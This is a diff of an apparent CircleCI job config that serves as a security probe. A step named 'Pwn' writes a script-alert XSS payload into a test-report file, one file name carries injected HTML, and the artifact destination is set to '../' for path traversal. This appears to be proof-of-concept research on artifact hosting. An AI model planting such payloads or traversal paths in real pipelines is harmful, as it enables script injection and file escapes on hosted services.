@@ -17,7 +17,7 @@ jobs:
       - run:
           name: Pwn
           command: |
-              echo '<script>alert(document.domain)</script>' > '/home/circleci/project/test-reports/test<h1>a.svg'
+              echo '<script>alert(document.domain)</script>' > '/home/circleci/project/test-reports/test.pdf'
       - run:
           name: Download Selenium
           command: |
@@ -47,7 +47,7 @@ jobs:
             python manage.py test
       - store_artifacts:
           path: test-reports/
-          destination: tr1
+          destination: ../
       - store_test_results:
           path: test-reports/
       - add_ssh_keys:
